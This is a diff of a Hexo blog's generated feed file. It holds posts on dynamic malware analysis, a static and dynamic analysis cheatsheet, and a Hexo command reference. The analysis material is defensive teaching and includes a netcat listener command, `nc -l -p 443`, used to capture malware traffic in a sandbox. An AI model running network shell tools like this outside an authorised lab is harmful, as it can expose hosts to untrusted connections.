-<li><p><strong>Observing Malware Behavior</strong>:</p>
-<ul>
-<li>Track file and registry changes using tools like <strong>Regshot</strong>.</li>
-<li>Monitor processes with <strong>Process Monitor</strong> and <strong>Process Explorer</strong>.</li>
-<li>Intercept DNS requests with <strong>ApateDNS</strong> to identify malicious connections.</li>
-</ul>
-</li>
-<li><p><strong>Analyzing Network Activity</strong>:</p>
-<ul>
-<li>Utilize tools like <strong>NetCat</strong> or sandbox environments to capture data exchanged with Command-and-Control (C2) servers.</li>
-</ul>
-</li>
-<li><p><strong>Detailed Analysis</strong>:</p>
-<ul>
-<li>Use advanced tools like <strong>dnSpy</strong> and <strong>Ghidra</strong> to unpack and deobfuscate malicious code, revealing hidden instructions and payloads.</li>
-</ul>
-</li>
-</ol>
-<p>Dynamic analysis complements static methods, offering insights into malware’s real-world impact and enabling analysts to develop effective countermeasures.</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> Ethical Hacking </tag>
+            
+            <tag> Penetration Testing </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Dynamic Malware Analysis</title>
+      <link href="/2025/01/28/Malware-Analysis-Project/"/>
+      <url>/2025/01/28/Malware-Analysis-Project/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Dynamic malware analysis is a crucial technique for understanding the behavior of malicious software in a controlled environment. By observing how malware executes and interacts with its host system, we can uncover hidden functionalities, identify affected files and processes, and better prepare countermeasures. Watch the introduction to dynamic malware analysis here:</p><iframe src="https://www.youtube.com/embed/u3_Cv-tJcck?si=wn69NaAJAmbn8C4W" width="100%" height="415" frameborder="0" loading="lazy" allowfullscreen></iframe><h2 id="Dynamic-Malware-Analysis"><a href="#Dynamic-Malware-Analysis" class="headerlink" title="Dynamic Malware Analysis"></a>Dynamic Malware Analysis</h2><p>Dynamic malware analysis involves running the malware in a secure environment to observe its runtime behavior. This method reveals how malware impacts the system, including file changes, process creation, network activities, and registry modifications. By using tools like <strong>Process Monitor</strong>, <strong>Regshot</strong>, and <strong>ApateDNS</strong>, analysts can track these activities and understand the malware’s objectives.</p><h3 id="Key-Steps"><a href="#Key-Steps" class="headerlink" title="Key Steps:"></a>Key Steps:</h3><ol><li><p><strong>Setting Up a Secure Environment</strong>:</p><ul><li>Use virtual machines to isolate malware from the host system.</li><li>Configure network settings to prevent unauthorized connections.</li></ul></li><li><p><strong>Observing Malware Behavior</strong>:</p><ul><li>Track file and registry changes using tools like <strong>Regshot</strong>.</li><li>Monitor processes with <strong>Process Monitor</strong> and <strong>Process Explorer</strong>.</li><li>Intercept DNS requests with <strong>ApateDNS</strong> to identify malicious connections.</li></ul></li><li><p><strong>Analyzing Network Activity</strong>:</p><ul><li>Utilize tools like <strong>NetCat</strong> or sandbox environments to capture data exchanged with Command-and-Control (C2) servers.</li></ul></li><li><p><strong>Detailed Analysis</strong>:</p><ul><li>Use advanced tools like <strong>dnSpy</strong> and <strong>Ghidra</strong> to unpack and deobfuscate malicious code, revealing hidden instructions and payloads.</li></ul></li></ol><iframe src="https://www.youtube.com/embed/lH7gBbJTtxE?si=_NV4GeAoJZsNpst_" width="100%" height="415" frameborder="0" loading="lazy" allowfullscreen></iframe><p>Dynamic analysis complements static methods, offering insights into malware’s real-world impact and enabling analysts to develop effective countermeasures.</p>]]></content>
+      
+      
       <categories>
-        <category>Cybersecurity</category>
-        <category>Malware</category>
+          
+          <category> Cybersecurity </category>
+          
+          <category> Malware </category>
+          
       </categories>
-      <tags>
-        <tag>Analysis</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Basic Static and Dynamic Analysis cheatsheet</title>
-    <url>/2024/11/22/basic-static-and-dynamic-analysis/</url>
-    <content><![CDATA[<p>This cheatsheet is not indepth and detailed. It will only cover the required minimum<br>Might make a more indepth version when required.</p>
-<h2 id="Basic-Static-Analysis"><a href="#Basic-Static-Analysis" class="headerlink" title="Basic Static Analysis"></a>Basic Static Analysis</h2><ol>
-<li><strong>Malware Fingerprint</strong><ul>
-<li><strong>AV Scanning</strong><ul>
-<li>Hashing</li>
-<li>VirusTotal</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong>Finding String in Malware</strong><ul>
-<li><strong>Representation of Strings</strong><ul>
-<li>ASCII (1 Byte), Hexadecimal</li>
-<li>Unicode (2 Bytes)</li>
-</ul>
-</li>
-<li><strong>BinText</strong>: String Extraction Tool</li>
-</ul>
-</li>
-<li><strong>Portable Executable Format</strong></li>
-<li><strong>Source to Execution</strong><ul>
-<li><strong>Compiler</strong>: Translates high-level code to machine code</li>
-<li><strong>Linker</strong>: Links <code>.obj</code> files into a single <code>.exe</code> executable</li>
-<li><strong>Loader</strong>: Allocates memory space and prepares the execution file</li>
-</ul>
-</li>
-<li><strong>Linking</strong><ul>
-<li><strong>Static Linking</strong>: Library copied into executable at start</li>
-<li><strong>Dynamic Linking</strong>: Searches and loads library at runtime</li>
-</ul>
-</li>
-<li><strong>Loading a PE</strong><ul>
-<li><strong>Absolute Loading</strong>: Same address</li>
-<li><strong>Relocatable Loading</strong>: Different address based on availability</li>
-<li><strong>Dynamic Run-time Loading</strong>: Different address while running</li>
-</ul>
-</li>
-<li><strong>Address Binding</strong>: Binding of Virtual Address to Physical Address<ul>
-<li>Relative Virtual Addresses</li>
-<li>Base Address</li>
-</ul>
-</li>
-<li><strong>PE File Format</strong><ul>
-<li><strong>PE Sections</strong><ul>
-<li><code>.edata</code> (Export Data)</li>
-<li><code>.reloc</code> (Base Relocation)</li>
-</ul>
-</li>
-<li><strong>Dependency Walker</strong>: See <code>.edata</code> &amp; <code>.idata</code></li>
-<li><strong>PEView</strong>: View files when compiled</li>
-</ul>
-</li>
-<li><strong>Packing Executable</strong><ul>
-<li><strong>PEiD</strong>: Detect packed PE<ul>
-<li><strong>PEiD Unpacker</strong>: Use plugins to unpack</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong>Indicators of Malware</strong></li>
-</ol>
-<ul>
-<li><strong>Host-based Indicators</strong>: Affect the system (files, registry, process operations)</li>
-<li><strong>Network-based Indicators</strong>: Communicate with external IPs and URLs (Internet, socket operations)</li>
-</ul>
-<h2 id="Basic-Dynamic-Analysis"><a href="#Basic-Dynamic-Analysis" class="headerlink" title="Basic Dynamic Analysis"></a>Basic Dynamic Analysis</h2><ol>
-<li><strong>Running the Malware</strong><ul>
-<li><strong>Sandboxes</strong><ul>
-<li><strong>GFI Sandboxes</strong><ul>
-<li><strong>Mutex</strong>: Prevents multiple threads&#x2F;processes from accessing a resource</li>
-</ul>
-</li>
-<li><strong>Sandboxes Drawbacks</strong></li>
-</ul>
-</li>
-<li><strong>rundll32.exe</strong>: (Run DLL with export arguments)</li>
-</ul>
-</li>
-<li><strong>Process Monitoring</strong><ul>
-<li><strong>procmon</strong>: Historical monitoring</li>
-<li><strong>Process Explorer</strong>: Live monitoring</li>
-</ul>
-</li>
-<li><strong>Registry Monitoring</strong><ul>
-<li><strong>regshot</strong>: Compare registry before and after</li>
-<li><strong>CaptureBat</strong></li>
-</ul>
-</li>
-<li><strong>Network Monitoring</strong><ul>
-<li><strong>ApateDNS</strong>: Fake a network (127.0.0.1)<ul>
-<li>Change Local Host in TCP&#x2F;IP properties to <code>127.0.0.1</code></li>
-<li>Change DNS reply address in ApateDNS to <code>127.0.0.1</code></li>
-</ul>
-</li>
-<li><strong>NetCat</strong>: Command <code>nc -l -p 443</code> (-l is a lowercase L)</li>
-<li><strong>Wireshark</strong></li>
-</ul>
-</li>
-</ol>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> Analysis </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hexo Cheatsheet</title>
+      <link href="/2025/01/27/hexo-cheatsheet/"/>
+      <url>/2025/01/27/hexo-cheatsheet/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Hexo-Cheatsheet"><a href="#Hexo-Cheatsheet" class="headerlink" title="Hexo Cheatsheet"></a>Hexo Cheatsheet</h2><p>I created this cheatsheet to provide a quick and easy reference for Hexo commands. Whether you’re just getting started with Hexo or are an experienced user, this guide will help you navigate the essential commands for installation, post management, deployment, and server setup. The goal is to simplify your workflow and reduce the time spent searching for the right command.</p><h3 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo -g        <span class="comment"># Install Hexo globally</span></span><br><span class="line">npm update hexo -g         <span class="comment"># Update Hexo globally</span></span><br><span class="line">hexo init                  <span class="comment"># Initialize a new Hexo project</span></span><br></pre></td></tr></table></figure><h3 id="Command-Overview"><a href="#Command-Overview" class="headerlink" title="Command Overview"></a>Command Overview</h3><h4 id="init"><a href="#init" class="headerlink" title="init"></a><code>init</code></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init [folder]</span><br></pre></td></tr></table></figure><p>Initializes a Hexo website. If no folder is provided, Hexo sets up the site in the current directory. It clones the <code>hexo-starter</code> template and installs dependencies using Yarn, npm, or pnpm (depending on what is available).</p><h4 id="new"><a href="#new" class="headerlink" title="new"></a><code>new</code></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure><p>Creates a new post or page. If no layout is provided, Hexo uses the default layout from <code>_config.yml</code>. For drafts, use the <code>draft</code> layout.</p><h5 id="Options"><a href="#Options" class="headerlink" title="Options:"></a>Options:</h5><ul><li><code>-p, --path</code>: Specify the post path.</li><li><code>-r, --replace</code>: Replace an existing post.</li><li><code>-s, --slug</code>: Customize the URL slug for the post.</li></ul><p>Example:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page --path about/me <span class="string">&quot;About me&quot;</span></span><br></pre></td></tr></table></figure><p>Creates a page at <code>source/about/me.md</code> with the title “About me.”</p><h4 id="generate"><a href="#generate" class="headerlink" title="generate"></a><code>generate</code></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo generate</span><br></pre></td></tr></table></figure><p>Generates static files for your Hexo website.</p><h5 id="Options-1"><a href="#Options-1" class="headerlink" title="Options:"></a>Options:</h5><ul><li><code>-d, --deploy</code>: Deploy the site after generation.</li><li><code>-w, --watch</code>: Watch for file changes and regenerate.</li><li><code>-b, --bail</code>: Stop if an error occurs during generation.</li><li><code>-f, --force</code>: Force regeneration of all files.</li><li><code>-c, --concurrency</code>: Set the maximum number of files to generate in parallel (default is unlimited).</li></ul><h4 id="publish"><a href="#publish" class="headerlink" title="publish"></a><code>publish</code></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo publish [layout] &lt;filename&gt;</span><br></pre></td></tr></table></figure><p>Publishes a draft post.</p><h4 id="server"><a href="#server" class="headerlink" title="server"></a><code>server</code></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure><p>Starts a local server (default at <a href="http://localhost:4000/">http://localhost:4000</a>).</p><h5 id="Options-2"><a href="#Options-2" class="headerlink" title="Options:"></a>Options:</h5><ul><li><code>-p, --port</code>: Override the default port.</li><li><code>-s, --static</code>: Serve only static files.</li><li><code>-l, --log</code>: Enable logging and customize the format.</li></ul><h4 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a><code>deploy</code></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></table></figure><p>Deploys your website to the configured remote location.</p><h5 id="Options-3"><a href="#Options-3" class="headerlink" title="Options:"></a>Options:</h5><ul><li><code>-g, --generate</code>: Generate static files before deployment.</li></ul><h4 id="render"><a href="#render" class="headerlink" title="render"></a><code>render</code></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo render &lt;file1&gt; [file2] ...</span><br></pre></td></tr></table></figure><p>Renders specific files (e.g., Markdown or HTML).</p><h5 id="Options-4"><a href="#Options-4" class="headerlink" title="Options:"></a>Options:</h5><ul><li><code>-o, --output</code>: Specify the output destination.</li></ul><h4 id="migrate"><a href="#migrate" class="headerlink" title="migrate"></a><code>migrate</code></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo migrate &lt;<span class="built_in">type</span>&gt;</span><br></pre></td></tr></table></figure><p>Migrates content from other blogging systems to Hexo.</p><h4 id="clean"><a href="#clean" class="headerlink" title="clean"></a><code>clean</code></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure><p>Cleans the cache file (<code>db.json</code>) and generated files (<code>public</code> folder).</p><h4 id="list"><a href="#list" class="headerlink" title="list"></a><code>list</code></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo list &lt;<span class="built_in">type</span>&gt;</span><br></pre></td></tr></table></figure><p>Lists all routes or items of a specified type.</p><h4 id="version"><a href="#version" class="headerlink" title="version"></a><code>version</code></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo version</span><br></pre></td></tr></table></figure><p>Displays version information for Hexo.</p><h4 id="config"><a href="#config" class="headerlink" title="config"></a><code>config</code></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo config [key] [value]</span><br></pre></td></tr></table></figure><p>Lists or modifies the configuration in <code>_config.yml</code>. If only a key is specified, its value is shown; if both key and value are provided, the value is updated.</p><hr><h3 id="Special-Modes-and-Options"><a href="#Special-Modes-and-Options" class="headerlink" title="Special Modes and Options"></a>Special Modes and Options</h3><h4 id="Safe-Mode"><a href="#Safe-Mode" class="headerlink" title="Safe Mode"></a>Safe Mode</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo --safe</span><br></pre></td></tr></table></figure><p>Disables plugins and scripts. Use this if you encounter issues after installing new plugins.</p><h4 id="Debug-Mode"><a href="#Debug-Mode" class="headerlink" title="Debug Mode"></a>Debug Mode</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo --debug</span><br></pre></td></tr></table></figure><p>Logs detailed debug information. Use this mode if you encounter problems with Hexo.</p><h4 id="Silent-Mode"><a href="#Silent-Mode" class="headerlink" title="Silent Mode"></a>Silent Mode</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo --silent</span><br></pre></td></tr></table></figure><p>Suppresses output in the terminal.</p><h4 id="Customize-Config-File-Path"><a href="#Customize-Config-File-Path" class="headerlink" title="Customize Config File Path"></a>Customize Config File Path</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo --config custom.yml</span><br></pre></td></tr></table></figure><p>Uses a custom configuration file instead of the default <code>_config.yml</code>. You can specify multiple config files separated by commas.</p><p>Example:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo --config custom.yml,custom2.json</span><br></pre></td></tr></table></figure><h4 id="Display-Drafts"><a href="#Display-Drafts" class="headerlink" title="Display Drafts"></a>Display Drafts</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo --draft</span><br></pre></td></tr></table></figure><p>Displays posts that are in the draft folder (<code>source/_drafts</code>).</p><h4 id="Customize-Current-Working-Directory-CWD"><a href="#Customize-Current-Working-Directory-CWD" class="headerlink" title="Customize Current Working Directory (CWD)"></a>Customize Current Working Directory (CWD)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo --cwd /path/to/cwd</span><br></pre></td></tr></table></figure><p>Changes the current working directory to the specified path.</p><hr><h3 id="Shorthands"><a href="#Shorthands" class="headerlink" title="Shorthands"></a>Shorthands</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hexo n                     <span class="comment"># hexo new</span></span><br><span class="line">hexo p                     <span class="comment"># hexo publish</span></span><br><span class="line">hexo g                     <span class="comment"># hexo generate</span></span><br><span class="line">hexo s                     <span class="comment"># hexo server</span></span><br><span class="line">hexo d                     <span class="comment"># hexo deploy</span></span><br><span class="line"></span><br><span class="line">hexo s -g                  <span class="comment"># hexo server with generator</span></span><br><span class="line">hexo s -g --draft          <span class="comment"># hexo server with generator and show drafts</span></span><br></pre></td></tr></table></figure><h3 id="Server-Commands"><a href="#Server-Commands" class="headerlink" title="Server Commands"></a>Server Commands</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hexo server                <span class="comment"># Hexo will watch files, no need to restart the server</span></span><br><span class="line">hexo server -s             <span class="comment"># Static mode, serves the public folder and disables file watching</span></span><br><span class="line">hexo server -p 5000        <span class="comment"># Change port to 5000</span></span><br><span class="line">hexo server -i 192.168.1.1 <span class="comment"># Use custom IP address</span></span><br><span class="line">hexo clean                 <span class="comment"># Cleans the cache file (db.json) and generated files (public)</span></span><br><span class="line">hexo g                     <span class="comment"># Generates static files</span></span><br><span class="line">hexo d                     <span class="comment"># Deploys your website</span></span><br></pre></td></tr></table></figure><h3 id="Post-Management"><a href="#Post-Management" class="headerlink" title="Post Management"></a>Post Management</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hexo new <span class="string">&quot;postName&quot;</span>        <span class="comment"># Create a new post (saved in _posts/postName.md)</span></span><br><span class="line">hexo new page <span class="string">&quot;pageName&quot;</span>   <span class="comment"># Create a new page</span></span><br><span class="line">hexo new [layout] &lt;title&gt;  <span class="comment"># Create a new post with a specific layout</span></span><br><span class="line">hexo new photo <span class="string">&quot;My Gallery&quot;</span> <span class="comment"># Create a new photo gallery</span></span><br><span class="line">hexo new <span class="string">&quot;Hello World&quot;</span> --lang tw <span class="comment"># Create a post with a specific language</span></span><br><span class="line"></span><br><span class="line">hexo new draft <span class="string">&quot;New Draft&quot;</span>  <span class="comment"># Create a new draft (saved in _drafts/New-Draft.md)</span></span><br><span class="line">hexo publish <span class="string">&quot;New Draft&quot;</span>    <span class="comment"># Move draft to _posts (publish it)</span></span><br></pre></td></tr></table></figure><hr><h2 id="TL-DR-Hexo-Cheatsheet"><a href="#TL-DR-Hexo-Cheatsheet" class="headerlink" title="TL;DR Hexo Cheatsheet"></a>TL;DR Hexo Cheatsheet</h2><h3 id="Installation-1"><a href="#Installation-1" class="headerlink" title="Installation"></a>Installation</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo -g        <span class="comment"># Install Hexo globally</span></span><br><span class="line">hexo init                  <span class="comment"># Initialize a new Hexo project</span></span><br></pre></td></tr></table></figure><h3 id="Common-Commands"><a href="#Common-Commands" class="headerlink" title="Common Commands"></a>Common Commands</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo new &lt;title&gt;           <span class="comment"># Create a new post</span></span><br><span class="line">hexo generate              <span class="comment"># Generate static files</span></span><br><span class="line">hexo deploy                <span class="comment"># Deploy the site</span></span><br><span class="line">hexo server                <span class="comment"># Start the local server</span></span><br><span class="line">hexo clean                 <span class="comment"># Clean cache and generated files</span></span><br></pre></td></tr></table></figure><h3 id="Short-Commands"><a href="#Short-Commands" class="headerlink" title="Short Commands"></a>Short Commands</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo n                     <span class="comment"># hexo new</span></span><br><span class="line">hexo p                     <span class="comment"># hexo publish</span></span><br><span class="line">hexo g                     <span class="comment"># hexo generate</span></span><br><span class="line">hexo s                     <span class="comment"># hexo server</span></span><br><span class="line">hexo d                     <span class="comment"># hexo deploy</span></span><br></pre></td></tr></table></figure><h3 id="Post-Management-1"><a href="#Post-Management-1" class="headerlink" title="Post Management"></a>Post Management</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo new draft &lt;title&gt;     <span class="comment"># Create a new draft post</span></span><br><span class="line">hexo publish &lt;filename&gt;    <span class="comment"># Publish a draft post</span></span><br></pre></td></tr></table></figure><h3 id="Deployment"><a href="#Deployment" class="headerlink" title="Deployment"></a>Deployment</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo deploy --generate     <span class="comment"># Generate and deploy</span></span><br></pre></td></tr></table></figure><h3 id="Server-Options"><a href="#Server-Options" class="headerlink" title="Server Options"></a>Server Options</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo server -p 5000        <span class="comment"># Run server on custom port</span></span><br><span class="line">hexo server -i 192.168.1.1 <span class="comment"># Use custom IP address</span></span><br></pre></td></tr></table></figure><hr><p>This quick reference covers the essential Hexo commands for daily use.<br>&#96;&#96;&#96;</p>]]></content>
+      
+      
       <categories>
-        <category>Malware Analysis</category>
+          
+          <category> Hexo </category>
+          
+          <category> Web Development </category>
+          
       </categories>
-      <tags>
-        <tag>Malware Analysis</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hexo Cheatsheet</title>
-    <url>/2025/01/27/hexo-cheatsheet/</url>
-    <content><![CDATA[<h2 id="Hexo-Cheatsheet"><a href="#Hexo-Cheatsheet" class="headerlink" title="Hexo Cheatsheet"></a>Hexo Cheatsheet</h2><p>I created this cheatsheet to provide a quick and easy reference for Hexo commands. Whether you’re just getting started with Hexo or are an experienced user, this guide will help you navigate the essential commands for installation, post management, deployment, and server setup. The goal is to simplify your workflow and reduce the time spent searching for the right command.</p>
-<h3 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo -g        <span class="comment"># Install Hexo globally</span></span><br><span class="line">npm update hexo -g         <span class="comment"># Update Hexo globally</span></span><br><span class="line">hexo init                  <span class="comment"># Initialize a new Hexo project</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Command-Overview"><a href="#Command-Overview" class="headerlink" title="Command Overview"></a>Command Overview</h3><h4 id="init"><a href="#init" class="headerlink" title="init"></a><code>init</code></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo init [folder]</span><br></pre></td></tr></table></figure>
-<p>Initializes a Hexo website. If no folder is provided, Hexo sets up the site in the current directory. It clones the <code>hexo-starter</code> template and installs dependencies using Yarn, npm, or pnpm (depending on what is available).</p>
-<h4 id="new"><a href="#new" class="headerlink" title="new"></a><code>new</code></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure>
-<p>Creates a new post or page. If no layout is provided, Hexo uses the default layout from <code>_config.yml</code>. For drafts, use the <code>draft</code> layout.</p>
-<h5 id="Options"><a href="#Options" class="headerlink" title="Options:"></a>Options:</h5><ul>
-<li><code>-p, --path</code>: Specify the post path.</li>
-<li><code>-r, --replace</code>: Replace an existing post.</li>
-<li><code>-s, --slug</code>: Customize the URL slug for the post.</li>
-</ul>
-<p>Example:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page --path about/me <span class="string">&quot;About me&quot;</span></span><br></pre></td></tr></table></figure>
-<p>Creates a page at <code>source/about/me.md</code> with the title “About me.”</p>
-<h4 id="generate"><a href="#generate" class="headerlink" title="generate"></a><code>generate</code></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo generate</span><br></pre></td></tr></table></figure>
-<p>Generates static files for your Hexo website.</p>
-<h5 id="Options-1"><a href="#Options-1" class="headerlink" title="Options:"></a>Options:</h5><ul>
-<li><code>-d, --deploy</code>: Deploy the site after generation.</li>
-<li><code>-w, --watch</code>: Watch for file changes and regenerate.</li>
-<li><code>-b, --bail</code>: Stop if an error occurs during generation.</li>
-<li><code>-f, --force</code>: Force regeneration of all files.</li>
-<li><code>-c, --concurrency</code>: Set the maximum number of files to generate in parallel (default is unlimited).</li>
-</ul>
-<h4 id="publish"><a href="#publish" class="headerlink" title="publish"></a><code>publish</code></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo publish [layout] &lt;filename&gt;</span><br></pre></td></tr></table></figure>
-<p>Publishes a draft post.</p>
-<h4 id="server"><a href="#server" class="headerlink" title="server"></a><code>server</code></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure>
-<p>Starts a local server (default at <a href="http://localhost:4000/">http://localhost:4000</a>).</p>
-<h5 id="Options-2"><a href="#Options-2" class="headerlink" title="Options:"></a>Options:</h5><ul>
-<li><code>-p, --port</code>: Override the default port.</li>
-<li><code>-s, --static</code>: Serve only static files.</li>
-<li><code>-l, --log</code>: Enable logging and customize the format.</li>
-</ul>
-<h4 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a><code>deploy</code></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>
-<p>Deploys your website to the configured remote location.</p>
-<h5 id="Options-3"><a href="#Options-3" class="headerlink" title="Options:"></a>Options:</h5><ul>
-<li><code>-g, --generate</code>: Generate static files before deployment.</li>
-</ul>
-<h4 id="render"><a href="#render" class="headerlink" title="render"></a><code>render</code></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo render &lt;file1&gt; [file2] ...</span><br></pre></td></tr></table></figure>
-<p>Renders specific files (e.g., Markdown or HTML).</p>
-<h5 id="Options-4"><a href="#Options-4" class="headerlink" title="Options:"></a>Options:</h5><ul>
-<li><code>-o, --output</code>: Specify the output destination.</li>
-</ul>
-<h4 id="migrate"><a href="#migrate" class="headerlink" title="migrate"></a><code>migrate</code></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo migrate &lt;<span class="built_in">type</span>&gt;</span><br></pre></td></tr></table></figure>
-<p>Migrates content from other blogging systems to Hexo.</p>
-<h4 id="clean"><a href="#clean" class="headerlink" title="clean"></a><code>clean</code></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure>
-<p>Cleans the cache file (<code>db.json</code>) and generated files (<code>public</code> folder).</p>
-<h4 id="list"><a href="#list" class="headerlink" title="list"></a><code>list</code></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo list &lt;<span class="built_in">type</span>&gt;</span><br></pre></td></tr></table></figure>
-<p>Lists all routes or items of a specified type.</p>
-<h4 id="version"><a href="#version" class="headerlink" title="version"></a><code>version</code></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo version</span><br></pre></td></tr></table></figure>
-<p>Displays version information for Hexo.</p>
-<h4 id="config"><a href="#config" class="headerlink" title="config"></a><code>config</code></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo config [key] [value]</span><br></pre></td></tr></table></figure>
-<p>Lists or modifies the configuration in <code>_config.yml</code>. If only a key is specified, its value is shown; if both key and value are provided, the value is updated.</p>
-<hr>
-<h3 id="Special-Modes-and-Options"><a href="#Special-Modes-and-Options" class="headerlink" title="Special Modes and Options"></a>Special Modes and Options</h3><h4 id="Safe-Mode"><a href="#Safe-Mode" class="headerlink" title="Safe Mode"></a>Safe Mode</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo --safe</span><br></pre></td></tr></table></figure>
-<p>Disables plugins and scripts. Use this if you encounter issues after installing new plugins.</p>
-<h4 id="Debug-Mode"><a href="#Debug-Mode" class="headerlink" title="Debug Mode"></a>Debug Mode</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo --debug</span><br></pre></td></tr></table></figure>
-<p>Logs detailed debug information. Use this mode if you encounter problems with Hexo.</p>
